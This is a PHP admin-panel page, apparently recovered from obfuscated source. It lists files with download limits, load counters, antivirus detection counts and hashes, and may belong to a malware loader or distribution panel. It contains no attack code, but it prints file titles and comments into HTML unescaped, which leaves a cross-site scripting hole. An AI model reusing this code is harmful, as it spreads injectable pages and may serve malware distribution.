<?php 
if( !defined("ADMIN_LOADED") ) 
{
    exit();
}

define("PAGE", "files");
list($files) = Browser2::getalldata(array( "files" ));
$months = array( "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December" );
$imgPath = Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=";
echo "\n\t<div class=\"title\">";
echo Lang::get("FilesList");
echo "</div>\n\t";
foreach( $files as $k => $file ) 
{
    $limit = $file["FileLimit"];
    $title = $file["Title"];
    $id = $file["ID"];
    $curLimit = Threads::findfile($id);
    if( $limit == 0 - 1 ) 
    {
        $curLimit = abs($curLimit) - 1;
    }

    $selThreads = array( array( "Limit" => $limit, "CurLimit" => $curLimit ) );
    echo "\t\t<div class=\"file";
    if( $k % 2 ) 
    {
        echo " odd";
    }

    echo "\" id=\"file";
    echo $file["ID"];
    echo "\">\n\t\t\t<div class=\"bl1\">\n\t\t\t\t<b>";
    echo $file["Title"];
    echo "</b>\n\t\t\t\t<br/>\n\t\t\t\t<span>";
    echo $file["Comment"];
    echo "&nbsp;</span>\n\t\t\t</div>\n\t\t\t<div class=\"bl2\">\n\t\t\t\t<div class=\"min\" onclick=\"Files.toggleFile(";
    echo $file["ID"];
    echo ")\"></div>\n\t\t\t\t<div class=\"edit\" onclick=\"Files.editFile(";
    echo $file["ID"];
    echo ")\"></div>\n\t\t\t\t<div class=\"close\" onclick=\"Files.deleteFile(";
    echo $file["ID"];
    echo ")\"></div>\n\t\t\t\t<div>";
    echo Lang::get("Date");
    echo ":</div> ";
    echo date("j ", $file["Date"]) . $months[date("m", $file["Date"]) - 1] . date(" Y", $file["Date"]);
    echo "\t\t\t\t<br/>\n\t\t\t\t<div>";
    echo Lang::get("Size");
    echo ":</div> ";
    echo _obfuscated_0D092607073D191D013123143C241125381A1F37060B11_(filesize(Config::get("FilesDir") . "/" . Threads::findfilename($file["ID"], $file["Title"])));
    echo "\t\t\t</div>\n\t\t\t<div class=\"fileContent\">\n\t\t\t\t<div class=\"bl3\">\n\t\t\t\t\t";
    foreach( $selThreads as $arr ) 
    {
        echo "\t\t\t\t\t\t<div class=\"threadStat\">";
        echo Lang::get("Loads");
        echo ":</div> <b>";
        echo number_format(($arr["Limit"] != 0 - 1 ? $arr["Limit"] - $arr["CurLimit"] : $arr["CurLimit"]), 0, "", " ");
        echo "</b> ";
        echo Lang::get("From");
        echo " <b>";
        if( $arr["Limit"] != 0 - 1 ) 
        {
            echo number_format($arr["Limit"], 0, "", " ");
        }
        else
        {
            echo "&#8734;";
        }

        echo "</b>\n\t\t\t\t\t\t<br/>\n\t\t\t\t\t";
    }
    echo "\t\t\t\t\t<img src=\"";
    echo $imgPath;
    echo "ajax-loader.gif\" width=\"16px\" height=\"16px\" style=\"display:none;\" id=\"loader";
    echo $file["ID"];
    echo "\"/>\n\t\t\t\t\t<br/>\n\t\t\t\t\t";
    if( Config::get("virtestLogin") != "" ) 
    {
        echo "\t\t\t\t\t<a href=\"javascript:void(0)\" onclick=\"Files.scan(";
        echo $file["ID"];
        echo ")\">";
        echo Lang::get("VirusCheck");
        echo "</a> <img src=\"";
        echo $imgPath;
        echo "bug";
        if( 0 < $file["ScanResult"] ) 
        {
            echo "2";
        }

        echo ".png\" width=\"16px\" height=\"16px\"/> <b>";
        echo $file["ScanResult"];
        echo "/";
        echo $file["ScanCount"];
        echo "</b>\n\t\t\t\t\t<br/>\n\t\t\t\t\t";
    }

    echo "\t\t\t\t\t<span>";
    if( $file["LastCheck"] != 0 ) 
    {
        echo "<a href=\"javascript:void(0)\" onclick=\"Files.showLast(" . $file["ID"] . ")\">";
    }

    echo Lang::get("LastCheck");
    if( $file["LastCheck"] != 0 ) 
    {
        echo "</a>";
    }

    echo ":</span> ";
    if( $file["LastCheck"] == 0 ) 
    {
        echo "\t\t\t\t\t\tnever\n\t\t\t\t\t";
    }
    else
    {
        echo "\t\t\t\t\t\t";
        echo date("d-m-Y H:i:s", $file["LastCheck"]);
        echo "\t\t\t\t\t";
    }

    echo "\t\t\t\t</div>\n\t\t\t\t<div class=\"bl4\">\n\t\t\t\t\t";
    foreach( $selThreads as $arr ) 
    {
        if( $arr["Limit"] == 0 - 1 ) 
        {
            $percent = 0;
            echo "\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t<img src=\"";
            echo $imgPath;
            echo "unlim-graph.gif\" width=\"176px\" height=\"6px\"/>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<br/>\n\t\t\t\t\t";
        }
        else
        {
            $percent = ($arr["Limit"] - $arr["CurLimit"]) / $arr["Limit"];
            $width = 176 * $percent - 6;
            echo "\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t<div class=\"c1\">\n\t\t\t\t\t\t\t\t<div class=\"c2\">\n\t\t\t\t\t\t\t\t\t<div class=\"c3\">\n\t\t\t\t\t\t\t\t\t\t";
            if( 0 < $percent ) 
            {
                echo "\t\t\t\t\t\t\t\t\t\t<div class=\"c7\" style=\"width:";
                echo $percent * 100;
                echo "%\">\n\t\t\t\t\t\t\t\t\t\t\t<div class=\"c4\" style=\"width:";
                echo $width;
                echo "px;\"></div>\n\t\t\t\t\t\t\t\t\t\t\t<div class=\"c5\">\n\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c6\">\n\t\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t";
            }

            echo "\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<br/>\n\t\t\t\t\t";
        }

        if( $percent == 1 ) 
        {
            echo "\t\t\t\t\t\t<script>\n\t\t\t\t\t\t\t\$('file";
            echo $file["ID"];
            echo "').addClassName('doned');\n\t\t\t\t\t\t</script>\n\t\t\t\t\t";
        }

        if( 0 < $file["ScanResult"] ) 
        {
            echo "\t\t\t\t\t\t<script>\n\t\t\t\t\t\t\t\$('file";
            echo $file["ID"];
            echo "').addClassName('virus');\n\t\t\t\t\t\t</script>\n\t\t\t\t\t";
        }

    }
    echo "\t\t\t\t\t<br/>\n\t\t\t\t\t<div class=\"hash\">CRC32:</div> ";
    echo dechex($file["CRC32"]);
    echo "\t\t\t\t\t<br/>\n\t\t\t\t\t<div class=\"hash\">MD5:</div> ";
    echo $file["MD5"];
    echo "\t\t\t\t</div>\n\t\t\t</div>\n\t\t</div>\n\t";
}
echo "\t<div class=\"foot\">\n\t\t<div class=\"btn\" onclick=\"Files.addFile()\">";
echo Lang::get("AddFileLabel");
echo "</div>\n\t</div>\n\t\n<script>\n\tEvent.observe(window, 'load', function () {\n\t\tFiles.addFileWindow = new Lightbox('addFileContainer');\n\t});\n</script>";

